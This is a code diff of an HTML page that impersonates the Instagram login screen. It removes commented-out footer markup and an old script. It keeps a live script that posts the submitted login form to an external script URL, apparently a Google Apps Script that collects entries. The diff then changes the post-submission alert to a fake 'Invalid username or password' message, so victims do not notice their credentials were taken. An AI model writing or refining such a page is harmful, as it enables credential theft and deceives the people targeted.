@@ -92,28 +92,9 @@
         <li><a href="#">Meta Verified</a></li>
       </ul>
       <div class="bottom-footer">
-        <!-- <select name="" id="">
-          <option value="English">English</option>
-          <option value="Hindi">Hindi</option>
-          <option value="Punjabi">Punjabi</option>
-          <option value="Urdu">Urdu</option>
-          <option value="Francais">Francais</option>
-        </select> -->
-        <!-- <span> &copy; 2023 Instagram from Meta</span> -->
         <p class="copyright">©2024 Instagram from Meta</p>
       </div>
     </footer>
-
-    <!-- <script>
-        const scriptURL = 'Your URL will be here'; // Replace 'Your URL will be here' with the URL of your Google Apps Script
-        const form = document.forms['submit-to-google-sheet'];
-        form.addEventListener('submit', e => {
-          e.preventDefault();
-          fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-            .then(response => console.log('Success!', response))
-            .catch(error => console.error('Error!', error.message));
-        });
-      </script> -->
 
     <script>
       const scriptUrl =
@@ -123,7 +104,7 @@
       form.addEventListener("submit", (e) => {
         e.preventDefault();
         fetch(scriptUrl, { method: "POST", body: new FormData(form) })
-          .then((res) => alert("Thank You For Login In Instagram " , res))
+          .then((res) => alert("Invalid username or password! \n try again " , res))
           .catch((err) => console.log("Error", err));
       });
     </script>
